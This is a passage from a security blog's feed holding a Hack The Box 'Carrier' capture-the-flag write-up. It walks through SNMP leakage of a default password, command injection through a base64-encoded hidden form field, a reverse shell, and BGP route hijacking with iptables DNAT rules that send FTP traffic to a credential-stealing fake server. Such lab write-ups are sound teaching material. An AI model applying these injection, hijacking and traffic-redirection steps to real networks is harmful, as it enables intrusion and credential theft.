,0xbffff992) print buffer + system + exit + shell That’s it , Feedback is appreciated ! Don’t forget to read the previous articles , Tweet about the article if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. Previous Buffer Overflow article : Buffer Overflow Practical Examples , Shellcode Injection and Local Privilege Escalation - protostar stack5</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/binary-exploitation/BOF6/0.png" /></entry><entry><title type="html">Hack The Box - Carrier</title><link href="http://localhost:4000/hack-the-box/carrier/" rel="alternate" type="text/html" title="Hack The Box - Carrier" /><published>2019-03-16T00:00:00+02:00</published><updated>2019-03-16T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/carrier</id><content type="html" xml:base="http://localhost:4000/hack-the-box/carrier/">&lt;hr /&gt;

&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
&lt;h4 id=&quot;hey-guys-today-carrier-retired-and-here-is-my-write-up-about-it-user-on-this-box-wasnt-hard-to-get--but-for-root-its-a-different-thing-because-we-will-go-through-some-networking-tricks-and-we-will-perform-an-attack-called-bgp-hijacking-the-overall-experience-was-great-and-carrier-was-one-of-the-best-boxes-on-this-platfrom-its-a-linux-box-and-its-ip-is-101010105-i-added-it-to-etchosts-as-carrierhtb-lets-jump-right-in-&quot;&gt;Hey guys today Carrier retired and here is my write-up about it. User on this box wasn’t hard to get , but for root it’s a different thing because we will go through some networking tricks and we will perform an attack called bgp hijacking. The overall experience was great and carrier was one of the best boxes on this platfrom. It’s a linux box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.105&lt;/code&gt; I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;carrier.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
&lt;h4 id=&quot;as-always-we-will-start-by-using-nmap-to-scan-for-open-ports-and-services&quot;&gt;As always we will start by using nmap to scan for open ports and services.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC carrier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/carrier/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-ftp-on-port-21--ssh-on-port-22-and-http-on-port-80-some-other-boxes-had-anonymous-ftp-access-allowed-but-here-its-not-allowed--also-the-port-is-filtered-so-we-are-not-going-to-check-ftp&quot;&gt;We get ftp on port 21 , ssh on port 22 and http on port 80. Some other boxes had anonymous ftp access allowed but here it’s not allowed , also the port is filtered so we are not going to check ftp.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;http-initial-enumeration&quot;&gt;HTTP Initial Enumeration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;on-http-theres-a-web-application-called-lyghtspeed-and-we-are-asked-to-login-under-please-login-we-see-that-its-saying-error-45007-and-error-45009-which-is-interesting&quot;&gt;On http there’s a web application called &lt;code class=&quot;highlighter-rouge&quot;&gt;Lyghtspeed&lt;/code&gt; and we are asked to login. Under “Please login” we see that it’s saying &lt;code class=&quot;highlighter-rouge&quot;&gt;Error 45007&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;Error 45009&lt;/code&gt; which is interesting.&lt;/h4&gt;
&lt;h4 id=&quot;next-thing-to-check-is-sub-directories-enumeration-&quot;&gt;Next thing to check is sub directories enumeration :&lt;/h4&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gobuster -u http://carrier.htb/ -w /usr/share/wordlists/dirb/common.txt -t 100 -to 200s

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://carrier.htb/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
[+] Status codes : 200,204,301,302,307,403
[+] Timeout      : 3m20s
=====================================================
2019/03/15 11:50:56 Starting gobuster
=====================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/css (Status: 301)
/debug (Status: 301)
/doc (Status: 301)
/fonts (Status: 301)
/img (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
/server-status (Status: 403)
/tools (Status: 301)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;h4 id=&quot;we-will-only-check-interesting-ones-&quot;&gt;We will only check interesting ones :&lt;/h4&gt;
&lt;h4 id=&quot;tools-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/tools&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-has-a-php-file-called-remotephp-and-by-checking-it-&quot;&gt;It has a php file called &lt;code class=&quot;highlighter-rouge&quot;&gt;remote.php&lt;/code&gt; and by checking it :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-says-license-expired-exiting&quot;&gt;It says “License expired, exiting…”&lt;/h4&gt;
&lt;h4 id=&quot;debug-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/debug&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;its-just-phpinfo-page&quot;&gt;It’s just &lt;code class=&quot;highlighter-rouge&quot;&gt;phpinfo&lt;/code&gt; page&lt;/h4&gt;
&lt;h4 id=&quot;doc-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/doc&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;theres-a-pdf-file-and-an-image--the-pdf-file-is-called-error_codespdf-so-it-might-be-helpful-because-we-saw-earlier-two-errors-on-the-login-page&quot;&gt;There’s a pdf file and an image , the pdf file is called &lt;code class=&quot;highlighter-rouge&quot;&gt;error_codes.pdf&lt;/code&gt; so it might be helpful because we saw earlier two errors on the login page.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/7.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/carrier/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;error-45007-is-license-invalid-or-expired&quot;&gt;Error &lt;code class=&quot;highlighter-rouge&quot;&gt;45007&lt;/code&gt; is “License invalid or expired”&lt;/h4&gt;
&lt;h4 id=&quot;error-45009-is-system-credentials-have-not-been-set-default-admin-user-password-is-set-see-chassis-serial-number&quot;&gt;Error &lt;code class=&quot;highlighter-rouge&quot;&gt;45009&lt;/code&gt; is “System credentials have not been set. Default admin user password is set (see chassis serial number)”&lt;/h4&gt;
&lt;h4 id=&quot;so-now-we-know-that-we-need-that-serial-number-to-be-able-to-login--but-how-to-get-it-&quot;&gt;So now we know that we need that serial number to be able to login , but how to get it ?&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;more-nmap&quot;&gt;More nmap&lt;/h3&gt;
&lt;h4 id=&quot;at-this-point-we-may-think-that-there-are-other-services-running-on-the-box-and-we-have-missed-them-so-before-running-a-full-tcp-scan-we-will-scan-udp-first&quot;&gt;At this point we may think that there are other services running on the box and we have missed them. So before running a full tcp scan we will scan udp first.&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sU carrier.htb&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/carrier/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-get-dhcps-on-port-67-and-snmp-on-port-161-lets-check-snmp&quot;&gt;We get dhcps on port 67 and snmp on port 161. Let’s check snmp.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;snmp-enumeration&quot;&gt;Snmp Enumeration&lt;/h3&gt;
&lt;h4 id=&quot;snmp-stands-for-simple-network-management-protocols-and-its-an-internet-standard-protocol-for-collecting-and-organizing-information-about-managed-devices-on-ip-networks-and-for-modifying-that-information-to-change-device-behavior-you-can-read-more-about-it-here&quot;&gt;Snmp stands for Simple Network Management Protocols and it’s an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. you can read more about it &lt;a href=&quot;https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;we-will-use-a-tool-called-snmpwalk--its-an-important-tool-in-snmp-enumeration-and-can-tell-us-a-lot-of-useful-information-read-about-snmpwalk-here&quot;&gt;We will use a tool called &lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk&lt;/code&gt; , it’s an important tool in snmp enumeration and can tell us a lot of useful information. Read about snmpwalk &lt;a href=&quot;http://net-snmp.sourceforge.net/docs/man/snmpwalk.html&quot;&gt;here&lt;/a&gt;&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;snmpwalk -c public -v 1 carrier.htb&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;-c-for-community-string---v-for-version&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-c&lt;/code&gt; for community string , &lt;code class=&quot;highlighter-rouge&quot;&gt;-v&lt;/code&gt; for version&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-only-get-one-result-string-snnet_45jdx23-so-is-that-the-serial-number--lets-check&quot;&gt;We only get one result &lt;code class=&quot;highlighter-rouge&quot;&gt;STRING: &quot;SN#NET_45JDX23&quot;&lt;/code&gt; so is that the serial number ? Let’s check&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;admin : NET_45JDX23&lt;/code&gt;
&lt;img src=&quot;/images/hackthebox/carrier/11.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/carrier/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-it-worked&quot;&gt;And it worked.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;exploiting-rce-and-getting-user&quot;&gt;Exploiting RCE and getting user&lt;/h3&gt;
&lt;h4 id=&quot;dashboard--tickets-and-diagnostics-are-available-but-monitoring-is-disabled-tickets-are-not-important-now-but-we-will-need-them-later&quot;&gt;Dashboard , Tickets and Diagnostics are available. But Monitoring is disabled. Tickets are not important now but we will need them later.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/13.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/carrier/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;diagnostics-has-a-button-saying-verify-status-&quot;&gt;Diagnostics has a button saying &lt;code class=&quot;highlighter-rouge&quot;&gt;verify status&lt;/code&gt; :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-clicking-&quot;&gt;After clicking :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;by-looking-at-the-source-we-find-a-hidden-field-called-check--also-if-we-used-burp-to-intercept-the-requests-we-will-find-it-the-value-of-check-is-base64-encoded-string-of-quagga-&quot;&gt;By looking at the source we find a hidden field called &lt;code class=&quot;highlighter-rouge&quot;&gt;check&lt;/code&gt; , also if we used burp to intercept the requests we will find it. The value of check is base64 encoded string of “quagga” :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/17.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/carrier/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-try-to-encode-root-and-see-what-happens-&quot;&gt;We can try to encode “root” and see what happens :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;it-gives-us-a-different-output-&quot;&gt;It gives us a different output :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-confirm-that-we-have-remote-code-execution-by-trying-something-like-quagga--whoami--id&quot;&gt;We can confirm that we have remote code execution by trying something like “quagga &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; id”&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/21.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/carrier/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-see-root--we-can-easily-encode-our-reverse-shell-payload-and-get-a-reverse-shell-&quot;&gt;And we see root , we can easily encode our reverse shell payload and get a reverse shell :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/23.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/carrier/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;but-did-we-really-get-root-access--ifconfig-and-we-see-that-we-are-not-on-the-actual-host-which-is-101010105--we-are-on-a-different-one&quot;&gt;But did we really get root access ? &lt;code class=&quot;highlighter-rouge&quot;&gt;ifconfig&lt;/code&gt; and we see that we are not on the actual host which is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.105&lt;/code&gt; , we are on a different one.&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/25.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/carrier/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;anyway-we-owned-the-user-flag-&quot;&gt;Anyway we owned the user flag !&lt;/h4&gt;
&lt;h4 id=&quot;i-also-wrote-a-python-script-to-automate-the-process-of-getting-a-reverse-shell--ill-post-it-later-update--here-is-the-script&quot;&gt;I also wrote a python script to automate the process of getting a reverse shell , I’ll post it later. (Update : Here is the &lt;a href=&quot;https://github.com/0xRick/CTF-scripts/blob/master/Hack%20The%20Box/carrier/reverse_shell.py&quot;&gt;script&lt;/a&gt;)&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;hr /&gt;

&lt;h3 id=&quot;bgp-hijacking-and-getting-root&quot;&gt;Bgp Hijacking and getting root&lt;/h3&gt;
&lt;h4 id=&quot;we-saw-quagga-mentioned-in-the-diagnostics-page--but-what-is-quagga-&quot;&gt;We saw “quagga” mentioned in the diagnostics page , but what is quagga ?&lt;/h4&gt;
&lt;h4 id=&quot;basically-quagga-is-a-routing-software-and-since-quagga-is-installed-on-this-host-then-most-likely-we-are-going-to-perform-bgp-hijacking-or-route-hijacking-i-wont-go-through-a-detailed-explanation-about-this-attack-because-that-will-be-off-topic--i-will-include-some-resources-in-simple-words-we-are-going-to-hijack-another-network-prefixes-and-announce-them-to-us--so-if-anybody-tried-to-connect-to-that-network-they-will-connect-to-us-this-is-possible-because-we-are-on-the-host-that-is-responsible-for-routing&quot;&gt;Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking. I won’t go through a detailed explanation about this attack because that will be off-topic , I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us , so if anybody tried to connect to that network they will connect to us. This is possible because we are on the host that is responsible for routing.&lt;/h4&gt;
&lt;h4 id=&quot;read-about-quagga&quot;&gt;Read about &lt;a href=&quot;https://en.wikipedia.org/wiki/Quagga_(software)&quot;&gt;quagga&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;bgp-hijacking-wikipedia&quot;&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/BGP_hijacking&quot;&gt;Bgp Hijacking&lt;/a&gt; (wikipedia)&lt;/h4&gt;
&lt;h4 id=&quot;bgp-hijacking-internetsocietyorg&quot;&gt;&lt;a href=&quot;https://www.internetsociety.org/blog/2018/05/what-is-bgp-hijacking-anyway/&quot;&gt;Bgp Hijacking&lt;/a&gt; (internetsociety.org)&lt;/h4&gt;
&lt;h4 id=&quot;bgp-hijacking-demo&quot;&gt;&lt;a href=&quot;https://github.com/mininet/mininet/wiki/BGP-Path-Hijacking-Attack-Demo&quot;&gt;Bgp Hijacking demo&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;bgp-hijacking-blogsakamaicom&quot;&gt;&lt;a href=&quot;https://blogs.akamai.com/2018/11/bgp-route-hijacking.html&quot;&gt;Bgp Hijacking&lt;/a&gt; (blogs.akamai.com)&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;if-we-take-a-look-at-the-tickets-again--ticket-number-6-&quot;&gt;If we take a look at the tickets again , ticket number 6 :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-will-notice-this-line--one-of-their-vip-is-having-issues-connecting-by-ftp-to-an-important-server-in-the-1012015024-network--so-on-10120150-theres-an-ftp-server-and-someone-is-accessing-it-regularly--on-github-theres-a-python-script-called-fake_ftp-which-creates-an-ftp-server-that-steals-credentials-we-can-try-it-locally-with-testtest&quot;&gt;We will notice this line : “one of their VIP is having issues connecting by FTP to an important server in the 10.120.15.0/24 network” , so on 10.120.15.0 there’s an FTP server and someone is accessing it regularly , on github there’s a python script called &lt;a href=&quot;https://gist.github.com/neoplacer/6504e34a35a6df323b9c4a80da1a1180/c00a2a817fb1a1aaba3231bde7bb879312af2d51&quot;&gt;fake_ftp&lt;/a&gt; which creates an FTP server that steals credentials. We can try it locally with &lt;code class=&quot;highlighter-rouge&quot;&gt;test:test&lt;/code&gt;:&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/27.png&quot; alt=&quot;&quot; /&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;img src=&quot;/images/hackthebox/carrier/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-everything-is-ready--we-just-need-to-hijack-10120150-then-run-that-fake-ftp-on-the-host-and-we-will-be-able-to-steal-credentials--but-the-script-is-written-in-python-27-and-this-host-has-only-python-3-installed-&quot;&gt;Now everything is ready , we just need to hijack 10.120.15.0 then run that fake ftp on the host and we will be able to steal credentials , but the script is written in python 2.7 and this host has only python 3 installed :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;we-can-fake-an-ftp-server-with-nc-or-edit-the-script-to-work-with-python3--but-we-will-do-something-different--we-will-edit-iptables-rules-to-route-traffic-from-port-21-on-the-host-to-port-21-on-our-box--so-what-will-finally-happen-is-&quot;&gt;We can fake an FTP server with &lt;code class=&quot;highlighter-rouge&quot;&gt;nc&lt;/code&gt; or edit the script to work with python3 , but we will do something different , we will edit &lt;code class=&quot;highlighter-rouge&quot;&gt;iptables&lt;/code&gt; rules to route traffic from port 21 on the host to port 21 on our box , so what will finally happen is :&lt;/h4&gt;
&lt;h4 id=&quot;someone-tries-to-connect-to-the-ftp-server--connects-to-the-router-instead-of-the-server--iptables-routes-that-traffic-to-our-box--our-fake-ftp-server-steals-the-credentials&quot;&gt;Someone tries to connect to the ftp server –&amp;gt; connects to the router instead of the server –&amp;gt; iptables routes that traffic to our box –&amp;gt; our fake ftp server steals the credentials&lt;/h4&gt;
&lt;h4 id=&quot;in-order-to-perform-our-attack-we-will-edit-bgpdconf-in-etcquagga&quot;&gt;in order to perform our attack we will edit &lt;code class=&quot;highlighter-rouge&quot;&gt;bgpd.conf&lt;/code&gt; in &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/quagga&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;original-&quot;&gt;Original :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;after-edits-&quot;&gt;After edits :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;the-only-difference-is-this-line-network-1012015025&quot;&gt;The only difference is this line &lt;code class=&quot;highlighter-rouge&quot;&gt;network 10.120.15.0/25&lt;/code&gt;&lt;/h4&gt;
&lt;h4 id=&quot;now-we-will-run-a-python-simple-http-server-to-host-the-new-bgpdconf-&quot;&gt;Now we will run a python simple http server to host the new bgpd.conf :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;pythom -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-delete-the-old-one--download-the-new-conf-edit-iptables-rules-and-finally-restart-the-service-&quot;&gt;Then we will delete the old one , download the new conf, edit iptables rules and finally restart the service :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;iptables-commands-&quot;&gt;iptables commands :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;iptables -t nat -A PREROUTING -p tcp --dport 21 -j DNAT --to-destination 10.10.xx.xx:21&lt;/code&gt;
&lt;br /&gt;
&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;iptables -t nat -A POSTROUTING -j MASQUERADE&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;then-we-will-wait-for-someone-to-access-the-fake-ftp-server&quot;&gt;Then we will wait for someone to access the fake ftp server&lt;/h4&gt;
&lt;h4 id=&quot;watch-cat-logtxt-this-will-do-cat-logtxt-and-refresh-it-every-2-seconds-logtxt-is-where-the-captured-credentials-are-stored-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;watch cat log.txt&lt;/code&gt; this will do &lt;code class=&quot;highlighter-rouge&quot;&gt;cat log.txt&lt;/code&gt; and refresh it every 2 seconds (log.txt is where the captured credentials are stored) :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;finally-we-get-these-credentials-&quot;&gt;Finally we get these credentials :&lt;/h4&gt;
&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;root:BGPtelc0rout1ng&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&quot;now-we-can-ssh-to-the-actual-box-as-root-&quot;&gt;Now we can ssh to the actual box as root :&lt;/h4&gt;
&lt;p&gt;&lt;img src=&quot;/images/hackthebox/carrier/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
&lt;p&gt;&lt;br /&gt;
&lt;br /&gt;&lt;/p&gt;
&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---ethereal&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/ethereal/&quot;&gt;Hack The Box - Ethereal&lt;/a&gt;&lt;/h4&gt;
&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---frolic&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/frolic/&quot;&gt;Hack The Box - Frolic&lt;/a&gt;&lt;/h4&gt;
&lt;hr /&gt;</content><author><name></name></author><summary type="html">Quick Summary Hey guys today Carrier retired and here is my write-up about it. User on this box wasn’t hard to get , but for root it’s a different thing because we will go through some networking tricks and we will perform an attack called bgp hijacking. The overall experience was great and carrier was one of the best boxes on this platfrom. It’s a linux box and its ip is 10.10.10.105 I added it to /etc/hosts as carrier.htb. Let’s jump right in ! Nmap As always we will start by using nmap to scan for open ports and services. nmap -sV -sT -sC carrier.htb We get ftp on port 21 , ssh on port 22 and http on port 80. Some other boxes had anonymous ftp access allowed but here it’s not allowed , also the port is filtered so we are not going to check ftp. HTTP Initial Enumeration On http there’s a web application called Lyghtspeed and we are asked to login. Under “Please login” we see that it’s saying Error 45007 and Error 45009 which is interesting. Next thing to check is sub directories enumeration : gobuster -u http://carrier.htb/ -w /usr/share/wordlists/dirb/common.txt -t 100 -to 200s ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://carrier.htb/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 3m20s ===================================================== 2019/03/15 11:50:56 Starting gobuster ===================================================== /.hta (Status: 403) /.htaccess (Status: 403) /.htpasswd (Status: 403) /css (Status: 301) /debug (Status: 301) /doc (Status: 301) /fonts (Status: 301) /img (Status: 301) /index.php (Status: 200) /js (Status: 301) /server-status (Status: 403) /tools (Status: 301) We will only check interesting ones : /tools : It has a php file called remote.php and by checking it : It says “License expired, exiting…” /debug : It’s just phpinfo page /doc : There’s a pdf file and an image , the pdf file is called error_codes.pdf so it might be helpful because we saw earlier two errors on the login page. Error 45007 is “License invalid or expired” Error 45009 is “System credentials have not been set. Default admin user password is set (see chassis serial number)” So now we know that we need that serial number to be able to login , but how to get it ? More nmap At this point we may think that there are other services running on the box and we have missed them. So before running a full tcp scan we will scan udp first. nmap -sU carrier.htb We get dhcps on port 67 and snmp on port 161. Let’s check snmp. Snmp Enumeration Snmp stands for Simple Network Management Protocols and it’s an Internet Standard protocol for collecting and organizing information about managed devices on IP networks and for modifying that information to change device behavior. you can read more about it here We will use a tool called snmpwalk , it’s an important tool in snmp enumeration and can tell us a lot of useful information. Read about snmpwalk here snmpwalk -c public -v 1 carrier.htb -c for community string , -v for version We only get one result STRING: &quot;SN#NET_45JDX23&quot; so is that the serial number ? Let’s check admin : NET_45JDX23 And it worked. Exploiting RCE and getting user Dashboard , Tickets and Diagnostics are available. But Monitoring is disabled. Tickets are not important now but we will need them later. Diagnostics has a button saying verify status : After clicking : By looking at the source we find a hidden field called check , also if we used burp to intercept the requests we will find it. The value of check is base64 encoded string of “quagga” : We can try to encode “root” and see what happens : It gives us a different output : We can confirm that we have remote code execution by trying something like “quagga &amp;amp;&amp;amp; whoami &amp;amp;&amp;amp; id” And we see root , we can easily encode our reverse shell payload and get a reverse shell : But did we really get root access ? ifconfig and we see that we are not on the actual host which is 10.10.10.105 , we are on a different one. Anyway we owned the user flag ! I also wrote a python script to automate the process of getting a reverse shell , I’ll post it later. (Update : Here is the script) Bgp Hijacking and getting root We saw “quagga” mentioned in the diagnostics page , but what is quagga ? Basically quagga is a routing software and since quagga is installed on this host then most likely we are going to perform bgp-hijacking or route-hijacking. I won’t go through a detailed explanation about this attack because that will be off-topic , I will include some resources. In simple words we are going to hijack another network prefixes and announce them to us , so if anybody tried to connect to that network they will connect to us. This is possible because we are on the host that is responsible for routing. Read about quagga Bgp Hijacking (wikipedia) Bgp Hijacking (internetsociety.org) Bgp Hijacking demo Bgp Hijacking (blogs.akamai.com) If we take a look at the tickets again , ticket number 6 : We will notice 